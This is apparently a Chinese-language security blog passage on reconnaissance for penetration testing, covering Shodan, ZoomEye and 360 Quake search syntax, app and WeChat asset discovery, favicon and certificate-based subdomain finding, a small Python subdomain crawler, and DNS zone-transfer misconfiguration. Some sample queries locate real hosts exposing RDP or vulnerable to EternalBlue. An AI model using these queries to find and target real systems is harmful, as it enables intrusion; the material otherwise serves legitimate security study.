<li>org：搜索指定的组织或机构，例如：<strong>org:“google”</strong></li>
<li>port：搜索指定的端口或服务，例如：<strong>port:“22”</strong></li>
<li>product：搜索指定的操作系统/软件/中间件，列如：<strong>product:“Samsung”</strong></li>
<li>screenshot.label：搜索指定描述图像内容的标签 列如：<strong>screenshot.label:“ics”</strong></li>
<li>os：搜索指定限定系统OS版本， 例如：<strong>os:“Windows Server 2008 R2”</strong></li>
<li>hostname：搜索指定的主机或域名，例如：<strong>hostname:“google”</strong></li>
<li>vuln：搜索指定CVE漏洞编号，例如：<strong>vuln:“CVE-2014-0723”</strong></li>
<li>isp：搜索指定的ISP供应商，例如：<strong>isp:“China Telecom”</strong></li>
<li>version：搜索指定的软件版本，例如：<strong>version:“1.2.3”</strong></li>
<li>geo：搜索指定的地理位置，参数为经纬度，例如：<strong>geo:“44.55,66.77”</strong></li>
</ul>
<h4 id="搜索案例" class="headerLink">
    <a href="#%e6%90%9c%e7%b4%a2%e6%a1%88%e4%be%8b" class="header-mark"></a>搜索案例</h4><p>搜索日本国家，中间件是Apache服务器并且状态码是200的机器</p>
<p>country:&ldquo;JP&rdquo; &amp;&amp; apache &amp;&amp; http.status:&ldquo;200&rdquo;</p>
<p>搜索日本国家，摄像头是海康威视</p>
<p>country:&ldquo;JP&rdquo; &amp;&amp; Hikvision-Webs</p>
<p>搜索日本国家，操作系统是Windows Server 2008 R2并且开放3389端口的机器</p>
<p>country:jp &amp;&amp; os:Windows Server 2008 R2 &amp;&amp; port:3389</p>
<p>搜索日本国家，操作系统是Windows Server并且存在永恒之蓝漏洞的机器(更高级会员才能使用vuln)</p>
<p>country:jp &amp;&amp; os:Windows Server * &amp;&amp; vuln:CVE-2017-0146</p>
<h4 id="shodanhttpssocsdnnetsosearchqshodanspm1001210130017020语法参考资料" class="headerLink">
    <a href="#shodanhttpssocsdnnetsosearchqshodanspm1001210130017020%e8%af%ad%e6%b3%95%e5%8f%82%e8%80%83%e8%b5%84%e6%96%99" class="header-mark"></a><a href="https://so.csdn.net/so/search?q=shodan&amp;spm=1001.2101.3001.7020" target="_blank" rel="noopener noreferrer">shodan</a>语法参考资料</h4><p><a href="https://www.shodan.io/search/filters" target="_blank" rel="noopener noreferrer">Filter Reference</a> <a href="https://www.shodan.io/search/filters" target="_blank" rel="noopener noreferrer">https://www.shodan.io/search/filters</a></p>
<p><a href="https://www.cnblogs.com/H4ck3R-XiX/p/12950736.html" target="_blank" rel="noopener noreferrer">Shodan使用指南 - zha0gongz1 - 博客园</a><a href="https://www.cnblogs.com/H4ck3R-XiX/p/12950736.html" target="_blank" rel="noopener noreferrer">https://www.cnblogs.com/H4ck3R-XiX/p/12950736.html</a></p>
<p><a href="https://blog.csdn.net/weixin_41489908/article/details/110404340" target="_blank" rel="noopener noreferrer">暗黑引擎 &ndash; Shodan常用搜索语法_web安全工具库的博客-CSDN博客_shodan搜索语法</a><a href="https://blog.csdn.net/weixin_41489908/article/details/110404340" target="_blank" rel="noopener noreferrer">https://blog.csdn.net/weixin_41489908/article/details/110404340</a></p>
<h3 id="钟馗之眼--知道创宇" class="headerLink">
    <a href="#%e9%92%9f%e9%a6%97%e4%b9%8b%e7%9c%bc--%e7%9f%a5%e9%81%93%e5%88%9b%e5%ae%87" class="header-mark"></a>钟馗之眼&ndash;知道创宇</h3><p><a href="https://www.zoomeye.org/" target="_blank" rel="noopener noreferrer">ZoomEye - Cyberspace Search Engine</a> <a href="https://www.zoomeye.org/" target="_blank" rel="noopener noreferrer">https://www.zoomeye.org/</a></p>
<p>免费： 查询结果展示量：4百条 查询API额度：每月1w</p>
<p>高级：4800/年 查询结果展示量：1千条 查询API额度：每月3w</p>
<p>VIP：9600/年 查询结果展示量：2千条 查询API额度：每月4w</p>
<p>高级与VIP功能差别：蜜罐识别</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-30771c54f4f5c259c5d9688c630a1d08a10d772b.png" title="image-20240318212239297" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-30771c54f4f5c259c5d9688c630a1d08a10d772b.png">
        
    </a></p>
<h4 id="语法-1" class="headerLink">
    <a href="#%e8%af%ad%e6%b3%95-1" class="header-mark"></a>语法</h4><ul>
<li>country：搜索指定国家 例如：<strong>country:“JP”</strong></li>
<li>city：搜索指定城市 例如：<strong>city:“San Diego”</strong></li>
<li><a href="https://www.zoomeye.org/searchResult?q=subdivisions:" target="_blank" rel="noopener noreferrer">subdivisions</a>：搜索相关指定行政区的资产 例如：<strong>subdivisions:“*</strong>*东京”**</li>
<li><a href="https://www.zoomeye.org/searchResult?q=ssl.cert.availability:1" target="_blank" rel="noopener noreferrer">ssl.cert.availability</a>：搜索证书是否在有效期内 例如：<strong>ssl:“1”or“0”</strong></li>
<li>ip：搜索指定的IP(ipv4/6) 列如：<a href="https://www.zoomeye.org/searchResult?q=ip:" target="_blank" rel="noopener noreferrer">ip:</a><strong>“8.8.8.8”</strong></li>
<li>cidr：搜索指定的IP段 列如：<a href="https://www.zoomeye.org/searchResult?q=cidr:52.2.254.36/24" target="_blank" rel="noopener noreferrer">cidr:</a><strong>“52.2.254.36/24”</strong></li>
<li>org：搜索指定的组织或机构，例如：<strong>org:“google”</strong></li>
<li>isp：搜索相关网络服务提供商的资产 例如：<a href="https://www.zoomeye.org/searchResult?q=isp:" target="_blank" rel="noopener noreferrer">isp:</a><strong>“China Mobile”</strong></li>
<li>port：搜索指定的端口或服务，例如：<strong>port:“22”</strong></li>
<li>hostname：搜索相关IP&quot;主机名&quot;的资产 例如：<a href="https://www.zoomeye.org/searchResult?q=hostname:google.com" target="_blank" rel="noopener noreferrer">hostname:</a><strong>“google.com”</strong></li>
<li>site：搜索域名相关的资产 例如：<a href="https://www.zoomeye.org/searchResult?q=site:baidu.com" target="_blank" rel="noopener noreferrer">site:</a><strong>“baidu.com”</strong></li>
<li>device：搜索路由器相关的设备类型 例如：<a href="https://www.zoomeye.org/searchResult?q=device:" target="_blank" rel="noopener noreferrer">device:</a><strong>“router”</strong></li>
<li>os：搜索指定限定系统OS版本， 例如：<strong>os:“Windows Server 2008 R2”</strong></li>
<li>title：搜索指定网页类容 例如：<a href="https://www.zoomeye.org/searchResult?q=title:" target="_blank" rel="noopener noreferrer">title:</a><strong>“hello world”</strong></li>
<li>app：搜索指定的组件 列如：<strong>app:“apache ”</strong></li>
<li>ver：搜索指定的版本 l例如：<strong>ver“1.2.3”</strong></li>
<li>service：指定服务类型 例如：<strong>service:“ftp”</strong></li>
</ul>
<h4 id="钟馗之眼语法参考资料" class="headerLink">
    <a href="#%e9%92%9f%e9%a6%97%e4%b9%8b%e7%9c%bc%e8%af%ad%e6%b3%95%e5%8f%82%e8%80%83%e8%b5%84%e6%96%99" class="header-mark"></a>钟馗之眼语法参考资料</h4><p><a href="https://blog.csdn.net/qq_42716969/article/details/105994291" target="_blank" rel="noopener noreferrer">Zoomeye-钟馗之眼语法参考_Pika_mia的博客-CSDN博客_zoomeye语法</a></p>
<p><a href="https://blog.csdn.net/ncafei/article/details/63683377" target="_blank" rel="noopener noreferrer">zoomeye用户使用手册_ncafei的博客-CSDN博客_zoomeye</a></p>
<p><a href="https://www.cnblogs.com/someone9/p/8688636.html" target="_blank" rel="noopener noreferrer">ZoomEye（钟馗之眼）搜索技巧记录： - _H0f - 博客园</a></p>
<p><a href="https://www.freebuf.com/sectool/163782.html" target="_blank" rel="noopener noreferrer">信息收集利器：ZoomEye - FreeBuf网络安全行业门户</a></p>
<h3 id="360-quake--360" class="headerLink">
    <a href="#360-quake--360" class="header-mark"></a>360 QUAKE&ndash;360</h3><p><a href="https://quake.360.cn/quake/#/index" target="_blank" rel="noopener noreferrer">360网络空间测绘 — 因为看见，所以安全</a></p>
<p>免费 数据广度开放性：5百条 Quake积分：3千/月</p>
<p>高级：299/年 数据广度开放性：5千条 Quake积分 ：3W/月</p>
<p>终身：999 数据广度开放性：1W条 Quake积分 ：5W/月</p>
<p>功能差别：相似图标、深度识别、专用语法、圈内交流</p>
<p><strong>邀请码： Cm2TX9</strong></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-b445c2758c9e2882e50979d8dffcf86f0d5bdbb8.png" title="image-20240318212247742" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-b445c2758c9e2882e50979d8dffcf86f0d5bdbb8.png">
        
    </a></p>
<h4 id="语法-2" class="headerLink">
    <a href="#%e8%af%ad%e6%b3%95-2" class="header-mark"></a>语法</h4><ul>
<li>country：搜索指定国家（中文添加_cn） 例如：<strong>country:“JP”</strong></li>
<li>city：搜索指定城市 例如：<strong>city:“tokyo ”</strong></li>
<li>owner：搜索IP归属单位 例如：<strong>owner:“tencent.com”</strong></li>
<li>isp：搜索IP归属运营商 例如：<strong>isp:“amazon.com”</strong></li>
<li>ip：查询IP地址或网段 列如：<strong>ip:&ldquo;1.1.1.1/22&rdquo;</strong></li>
<li>is_ipv6：查询IPV6格式的IP 列如：<strong>sis_ipv6:&ldquo;true&rdquo;</strong></li>
<li>port：搜索指定的端口或服务 例如：<strong>port:“[50 TO 60]”</strong></li>
<li>transport：查询udp数据 例如：<strong>transport:“udp”</strong></li>
<li>domain：查询资产域名 例如：<strong>domain:“google.com”</strong></li>
<li>hostname：查询主机名包含指定资产的数据 例如： <strong>hostname:“google.com”</strong></li>
<li>app：搜索指定的组件 列如：<strong>app:“apache ”</strong></li>
<li>response：查询端口原生返回数据中包含指定参数的资产 列如：<strong>response:“google.com”</strong></li>
</ul>
<h3 id="相应网站" class="headerLink">
    <a href="#%e7%9b%b8%e5%ba%94%e7%bd%91%e7%ab%99" class="header-mark"></a>相应网站</h3><p><a href="https://search.censys.io/" target="_blank" rel="noopener noreferrer">Censys Search</a></p>
<p><a href="https://www.greynoise.io/" target="_blank" rel="noopener noreferrer">GreyNoise</a></p>
<p><a href="https://zhidao.baidu.com/question/750335434727022652.html" target="_blank" rel="noopener noreferrer">各个国家代码是什么？_百度知道</a></p>
<p><a href="https://github.com/0x727/Space_view" target="_blank" rel="noopener noreferrer">https://github.com/0x727/Space_view</a></p>
<h3 id="聚合测绘空间搜索工具" class="headerLink">
    <a href="#%e8%81%9a%e5%90%88%e6%b5%8b%e7%bb%98%e7%a9%ba%e9%97%b4%e6%90%9c%e7%b4%a2%e5%b7%a5%e5%85%b7" class="header-mark"></a>聚合测绘空间搜索工具</h3><p>项目名称：聚合测绘空间搜索（<strong>HW*</strong>*蓝队情报收集**） 项目地址：<a href="https://github.com/atdpa4sw0rd/Search-Tools" target="_blank" rel="noopener noreferrer">https://github.com/atdpa4sw0rd/Search-Tools</a></p>
<p>支持搜索的引擎：<strong>Fofa*</strong>*、Zoomeye、Quake、Shodan、Censys、BinaryEdge、threatbook**</p>
<p>1. git clone <a href="https://github.com/atdpa4sw0rd/Search-Tools.git" target="_blank" rel="noopener noreferrer">https://github.com/atdpa4sw0rd/Search-Tools.git</a><br>
2. cd Search-Tools &amp;&amp; pip3 install -r requirements.txt<br>
3. python3 search_main.py</p>
<h2 id="app小程序公众号信息收集" class="headerLink">
    <a href="#app%e5%b0%8f%e7%a8%8b%e5%ba%8f%e5%85%ac%e4%bc%97%e5%8f%b7%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" class="header-mark"></a>APP、小程序、公众号信息收集</h2><h2 id="1app信息搜集" class="headerLink">
    <a href="#1app%e4%bf%a1%e6%81%af%e6%90%9c%e9%9b%86" class="header-mark"></a>1、APP信息搜集</h2><h3 id="11七麦数据" class="headerLink">
    <a href="#11%e4%b8%83%e9%ba%a6%e6%95%b0%e6%8d%ae" class="header-mark"></a>1.1、七麦数据</h3><p><a href="https://www.qimai.cn/" target="_blank" rel="noopener noreferrer">https://www.qimai.cn/</a></p>
<p>通过当前APP查询所属公司的所有APP</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-5a0e64e9f22d7e8ffe8716a468c9b432c0205b6a.png" title="image-20240318212256021" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-5a0e64e9f22d7e8ffe8716a468c9b432c0205b6a.png">
        
    </a></p>
<p>通过当前APP查询同开发者应用</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-43bdbe80295303d8a4306db84e5e246a2ba9ca6e.png" title="image-20240318212301308" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-43bdbe80295303d8a4306db84e5e246a2ba9ca6e.png">
        
    </a></p>
<h3 id="12appstore安卓和ios" class="headerLink">
    <a href="#12appstore%e5%ae%89%e5%8d%93%e5%92%8cios" class="header-mark"></a>1.2、AppStore(安卓和IOS)</h3><p>查询同开发者应用</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-3e73f4a78b398a26f0f06094cfcafff57be4876a.png" title="image-20240318213120983" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-3e73f4a78b398a26f0f06094cfcafff57be4876a.png">
        
    </a></p>
<h2 id="2微信公众号和小程序" class="headerLink">
    <a href="#2%e5%be%ae%e4%bf%a1%e5%85%ac%e4%bc%97%e5%8f%b7%e5%92%8c%e5%b0%8f%e7%a8%8b%e5%ba%8f" class="header-mark"></a>2、微信公众号和小程序</h2><p>通过微信搜索公众号并去关注，然后进去点击文章之类的，下拉可以看到它的网页来源，大部分是微信提供的，所以需要去阅读原文，但是原文也可能是第三方提供的，所以还需要自己自行去判断，找到它的url后又可以去爆一波子域名了，</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-4a5a6b737f38931bbfe8bc5289fff45f39b54bf6.png" title="image-20240318213133715" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-4a5a6b737f38931bbfe8bc5289fff45f39b54bf6.png">
        
    </a></p>
<p>随便点击文章通过下拉查看域名，例如：</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-d53e706f4c3fa0fc9dffdd67f5993a9bfdad34e0.png" title="image-20240318213145758" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-d53e706f4c3fa0fc9dffdd67f5993a9bfdad34e0.png">
        
    </a></p>
<h2 id="4logo" class="headerLink">
    <a href="#4logo" class="header-mark"></a>4、logo</h2><p>当你不确定目标产品是什么时，比如你不知道他是谁家的WAF或者路由器，可以利用查看网站logo地址，然后复制logo地址，点击按图片搜索，到谷歌里面查询；也可以把目标logo下载下来，利用上传图片来查询，通过搜索出来的结果可以判断目标产品和厂商。</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-19fe23983d34793a19756320b38c79aaccbde945.png" title="image-20240318213245804" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-19fe23983d34793a19756320b38c79aaccbde945.png">
        
    </a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-b0b27b2a69daa400657d01b1456b36f5a58b7909.png" title="image-20240318213250034" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-b0b27b2a69daa400657d01b1456b36f5a58b7909.png">
        
    </a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-f751011831118cbbad3a3af63d1fe895e045f4d1.png" title="image-20240318214058575" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-f751011831118cbbad3a3af63d1fe895e045f4d1.png">
        
    </a></p>
<h2 id="5faviconico" class="headerLink">
    <a href="#5faviconico" class="header-mark"></a>5、favicon.ico</h2><p>首先先来介绍一下什么favicon.ico文件，所谓favicon，便是其可以让浏览器的收藏夹中除显示相应的标题外，还以图标的方式区别不同的网站。favicon.ico也被称为 website icon（网页图标）、page icon（页面图标）或url icon（URL图标），具体细节请问度娘。下面这个小东西就是 Favicon.ico，我们可以通过在shodan里寻找它的哈希并去查找相关资产，打开shodan页面，或者用shodan插件都行。</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-3afa9d1b3afa239c35e19284955beb2a884e13be.png" title="image-20240318214108788" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-3afa9d1b3afa239c35e19284955beb2a884e13be.png">
        
    </a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-93ada0eed3bb7559a73a349725fdba1fb9821864.png" title="image-20240318214114650" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-93ada0eed3bb7559a73a349725fdba1fb9821864.png">
        
    </a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-83c0cb9582210821838fd7c6e478b07c66a59022.png" title="image-20240318214142064" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-83c0cb9582210821838fd7c6e478b07c66a59022.png">
        
    </a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-5dd1a1e922e1f5b8952a15e74b691026b73747aa.png" title="image-20240318214154617" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-5dd1a1e922e1f5b8952a15e74b691026b73747aa.png">
        
    </a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-237c3d3113fe9b9a3189becf8a57907fc8016bf4.png" title="image-20240318214159248" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-237c3d3113fe9b9a3189becf8a57907fc8016bf4.png">
        
    </a></p>
<h2 id="三子域名收集挖掘" class="headerLink">
    <a href="#%e4%b8%89%e5%ad%90%e5%9f%9f%e5%90%8d%e6%94%b6%e9%9b%86%e6%8c%96%e6%8e%98" class="header-mark"></a>三、子域名收集(挖掘)</h2><h2 id="1sslhttps证书" class="headerLink">
    <a href="#1sslhttps%e8%af%81%e4%b9%a6" class="header-mark"></a>1、SSL(HTTPS)证书</h2><p>点击浏览器网站旁边的小锁，然后点击证书就可以查看到该网站的SSL证书了</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-a6949b5126971885b1789786f3fbecb076868c0c.png" title="image-20240318214253774" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-a6949b5126971885b1789786f3fbecb076868c0c.png">
        
    </a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-7f5be2e3ea1d8a7e9505b44e446bd05a1cc7a454.png" title="image-20240318214300153" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-7f5be2e3ea1d8a7e9505b44e446bd05a1cc7a454.png">
        
    </a></p>
<h3 id="11大厂商ssl证书一证多用" class="headerLink">
    <a href="#11%e5%a4%a7%e5%8e%82%e5%95%86ssl%e8%af%81%e4%b9%a6%e4%b8%80%e8%af%81%e5%a4%9a%e7%94%a8" class="header-mark"></a>1.1、大厂商SSL证书一证多用</h3><p>大厂商的SSL证书一般都是<strong>一证多用</strong>，根据证书透明日志这个特性，可以得知一些子域名。</p>
<p>如百度：<a href="https://www.baidu.com/" target="_blank" rel="noopener noreferrer">https://www.baidu.com</a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-1e7449610f26d26e979b950228ae3b24db5d8ccd.png" title="image-20240318214312481" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-1e7449610f26d26e979b950228ae3b24db5d8ccd.png">
        
    </a></p>
<p>如搜狐：<a href="https://vpn.sohu-inc.com/" target="_blank" rel="noopener noreferrer">https://vpn.sohu-inc.com</a></p>
<h3 id="12https证书错误泄露域名" class="headerLink">
    <a href="#12https%e8%af%81%e4%b9%a6%e9%94%99%e8%af%af%e6%b3%84%e9%9c%b2%e5%9f%9f%e5%90%8d" class="header-mark"></a>1.2、HTTPS证书错误泄露域名</h3><p>有时候https证书报错会泄露域名</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-5e919d93be3284e3dfe8646b93514ef68cf37a9f.png" title="image-20240318214545325" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-5e919d93be3284e3dfe8646b93514ef68cf37a9f.png">
        
    </a></p>
<h3 id="13在线网站证书查询" class="headerLink">
    <a href="#13%e5%9c%a8%e7%ba%bf%e7%bd%91%e7%ab%99%e8%af%81%e4%b9%a6%e6%9f%a5%e8%af%a2" class="header-mark"></a>1.3、在线网站证书查询</h3><p><a href="https://crt.sh/" target="_blank" rel="noopener noreferrer">https://crt.sh/</a></p>
<p><a href="https://censys.io/" target="_blank" rel="noopener noreferrer">https://censys.io/</a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-4e6667b1e50d27f18d67cbb72cd30906570fd805.png" title="image-20240318214636905" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-4e6667b1e50d27f18d67cbb72cd30906570fd805.png">
        
    </a></p>
<h2 id="2网络深度爬虫" class="headerLink">
    <a href="#2%e7%bd%91%e7%bb%9c%e6%b7%b1%e5%ba%a6%e7%88%ac%e8%99%ab" class="header-mark"></a>2、网络深度爬虫</h2><p>以<a href="https://forum.butian.net/share/www.sina.com.cn" target="_blank" rel="noopener noreferrer">www.sina.com.cn</a>为例，我们使用正则表达式抓取页面以sina.com.cn结尾的所有的URL（一级深度）。</p>
<h2 id="usrbinenv-python" class="headerLink">
    <a href="#usrbinenv-python" class="header-mark"></a>!/usr/bin/env python</h2><h2 id="codingutf-8" class="headerLink">
    <a href="#codingutf-8" class="header-mark"></a>coding=utf-8</h2><h2 id="authordavefangoutlookcommailtodavefangoutlookcom" class="headerLink">
    <a href="#authordavefangoutlookcommailtodavefangoutlookcom" class="header-mark"></a>author=<a href="mailto:dave.fang@outlook.com" rel="">dave.fang@outlook.com</a></h2><h2 id="create20160701" class="headerLink">
    <a href="#create20160701" class="header-mark"></a>create=20160701</h2><p>import re</p>
<p>import requests</p>
<p>from pprint import pprint</p>
<p>def crawl_page(url, domain):</p>
<p>print(&rsquo;[*] Crawl URL: {0}&rsquo;.format(url))</p>
<p>found_url = set()</p>
<p>req = requests.get(url, timeout=15)</p>
<p>content = req.text</p>
<p>link_list = re.findall(r&quot;(?&lt;=href=&quot;).+?(?=&quot;)|(?&lt;=href=&rsquo;).+?(?=&rsquo;)&quot;, content)</p>
<p>for url in link_list:</p>
<p>result = re.findall(&lsquo;http[s]?://(.*?).sina.com.cn&rsquo;, url)</p>
<p>if len(result) &gt; 0:</p>
<p>found_url.add(&rsquo;{0}.{1}&rsquo;.format(result[0], domain))</p>
<p>pprint(found_url)</p>
<p>if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:</p>
<p>page_url = &lsquo;<a href="http://www.sina.com.cn/" target="_blank" rel="noopener noreferrer">http://www.sina.com.cn/</a>&rsquo;</p>
<p>main_domain = &lsquo;sina.com.cn&rsquo;</p>
<p>crawl_page(page_url, main_domain)</p>
<p>一级深度爬出来的结果，就有146个子域名，这个小脚本权当抛砖引玉，可以再深度定制。</p>
<p>[*] Crawl URL: <a href="http://www.sina.com.cn/" target="_blank" rel="noopener noreferrer">http://www.sina.com.cn/</a></p>
<p>{&lsquo;2016.sina.com.cn&rsquo;,</p>
<p>&lsquo;ah.sina.com.cn&rsquo;,</p>
<p>&lsquo;ai.lottery.sina.com.cn&rsquo;,</p>
<p>&lsquo;aipai.sina.com.cn&rsquo;,</p>
<p>&lsquo;app.sina.com.cn&rsquo;,</p>
<p>&lsquo;astro.sina.com.cn&rsquo;,</p>
<p>&lsquo;auto.sina.com.cn&rsquo;,</p>
<p>&lsquo;career.sina.com.cn&rsquo;,</p>
<p>&hellip;</p>
<p>&lsquo;golf.sina.com.cn&rsquo;,</p>
<p>&lsquo;zx.jiaju.sina.com.cn&rsquo;}</p>
<p>[*] Found Links Num: 146</p>
<h2 id="3域传送漏洞" class="headerLink">
    <a href="#3%e5%9f%9f%e4%bc%a0%e9%80%81%e6%bc%8f%e6%b4%9e" class="header-mark"></a>3、域传送漏洞</h2><p>快速判断出某个特定区域的所有主机,获取域信息,如网络拓扑结构、服务器ip地址,为攻击者的入侵提供大量敏感信息。</p>
<h3 id="31常用dns记录" class="headerLink">
    <a href="#31%e5%b8%b8%e7%94%a8dns%e8%ae%b0%e5%bd%95" class="header-mark"></a>3.1、常用DNS记录</h3><p>主机记录(A记录): A记录是用于名称解析的重要记录,它将特定的主机名映射到对应主机的IP地址上。</p>
<p>IPv6主机记录(AAAA记录): 与A记录对应,用于将特定的主机名映射到一个主机的IPv6地址。</p>
<p>别名(CNAME记录): CNAME记录用于将某个别名指向到某个A记录上,这样就不需要再为某个新名字另外创建一条新的A记录。</p>
<p>电子邮件交换记录（MX记录): 记录一个邮件域名对应的IP地址</p>
<p>域名服务器记录 (NS记录): 记录该域名由哪台域名服务器解析</p>
<p>反向记录(PTR记录): 也即从IP地址到域名的一条记录</p>
<p>TXT记录：记录域名的相关文本信息</p>
<h3 id="32dns区域传送" class="headerLink">
    <a href="#32dns%e5%8c%ba%e5%9f%9f%e4%bc%a0%e9%80%81" class="header-mark"></a>3.2、DNS区域传送</h3><p>DNS服务器分为主服务器、备份服务器和缓存服务器。而域传送指的是一台备用服务器使用来自主服务器的数据更新自己的域（zone）数据库。这为运行中的DNS服务提供了一定的冗余度,其目的是为了防止主的域名服务器因意外故障变得不可用时影响到整个域名的解析。</p>
<h3 id="33域传送漏洞" class="headerLink">
    <a href="#33%e5%9f%9f%e4%bc%a0%e9%80%81%e6%bc%8f%e6%b4%9e" class="header-mark"></a>3.3、域传送漏洞</h3><p>DNS区域传送(DNS transfer)指后备DNS服务器从主服务器获取数据,以更新自己的zone数据库，这可以防止因主DNS服务器故障造成的业务中断,为DNS服务提供了冗余备份，但是许多DNS服务器却被错误配置成只要收到AXFR请求,就向对方进行域传送。</p>
